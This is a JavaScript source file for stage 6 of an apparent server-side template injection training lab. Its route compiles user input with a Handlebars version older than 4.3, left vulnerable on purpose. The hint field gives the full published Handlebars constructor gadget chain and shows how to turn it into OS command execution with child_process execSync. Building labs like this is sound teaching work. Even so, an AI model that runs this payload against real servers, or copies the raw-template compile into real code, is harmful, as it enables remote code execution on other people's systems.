'use strict';

// Stage 6 — swaps the homemade evaluator for the real Handlebars engine, pinned to
// an old, known-vulnerable version (<4.3) — a "safe by design" logic-less template
// language with a real, published RCE in that version range.

const express = require('express');
const Handlebars = require('handlebars');
const shared = require('../shared');

module.exports = {
  stage: 6,
  slug: 'outdated-engine',
  title: 'Real engine, outdated version',
  defense: 'Compiles your template with the real Handlebars library instead of the homemade evaluator.',
  goal: 'Make the real Handlebars engine run code of your choosing — either read <code>__SSTI_FLAG__</code>, or go further and run a real OS command (e.g. <code>id</code>), proven by output like <code>uid=…</code>.',
  hint: "This isn't the homemade evaluator anymore — old word blacklists don't apply. Fingerprint the engine (the error style, the <code>{{#helper}}</code> syntax) and search for its name plus \"SSTI RCE\". Handlebars is logic-less by design and blocks <code>{{ this.constructor }}</code> directly — but an old, pinned version (this one predates 4.3) is missing a later security patch. The published gadget chain for that CVE: <code>{{#with \"s\" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return global.__SSTI_FLAG__;\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}</code>. That last <code>push</code>ed line is just a JS return statement — swap it for <code>return process.mainModule.require('child_process').execSync('id').toString();</code> to go past reading a variable and run a real OS command instead. Use <code>process.mainModule.require(...)</code>, not bare <code>require(...)</code> — a freshly-built <code>Function</code> runs in true global scope, and <code>require</code> is injected per-module by Node's CommonJS loader, not attached to <code>global</code>, so a bare reference throws <code>ReferenceError</code>. Also use <code>execSync</code>, not <code>exec</code> — <code>exec</code> is async and returns a <code>ChildProcess</code> object immediately, before the command's output exists.",
  lesson: 'A "safe by design" real template engine can still ship a version-specific RCE — you can\'t derive the gadget chain from first principles, you have to identify the exact engine and version and find its published exploit. Once you reach Function, you\'re not limited to reading a JS variable — process.mainModule.require(\'child_process\') turns it into full OS command execution.',
  explanation:
    "Handlebars is logic-less on purpose — it has no arithmetic or arbitrary JS expressions, so none of the earlier tricks even parse. But this pinned version predates the <code>protoAccessControl</code> patch that later Handlebars releases added specifically to block resolving <code>constructor</code>. The published gadget abuses the <code>with</code>/<code>lookup</code> helpers and array <code>push</code>/<code>pop</code> to smuggle a reference to <code>constructor</code> past the parser one property at a time, reaching <code>Function</code> and compiling fresh code — same destination as the homemade engine, reached through the real library's own helper surface. From there, reading <code>__SSTI_FLAG__</code> is just a property lookup, but <code>process.mainModule.require('child_process').execSync(...)</code> reaches the OS itself — the same class of impact as command injection (lab 10), just arrived at through a template engine instead of a shell string. Modern Handlebars hard-blocks <code>constructor</code> even if you re-enable prototype access, because this exact CVE is why that guard exists.",
  status: 'vulnerable',

  createRouter(ctx) {
    const r = express.Router();
    r.get('/', (req, res) => res.send(shared.stagePage(ctx, { content: shared.templateForm(ctx) })));
    r.post('/render', (req, res) => {
      const tpl = req.body.template || '';
      let out;
      try { out = Handlebars.compile(tpl)({}); }   //! the request's raw text is compiled as the template itself, on a Handlebars version predating its constructor-access guard
      catch { out = '∅'; }
      // Handlebars HTML-escapes {{this}} by default (uid=… becomes uid&#x3D;…), so accept
      // either form as proof a real OS command ran, alongside the flag-leak check.
      const success = shared.looksSSTI(out) || /uid(=|&#x3D;)\d+/.test(out);
      res.send(shared.stagePage(ctx, { content: shared.templateForm(ctx, tpl) + shared.outputPanel(out), success }));
    });
    return r;
  },
};
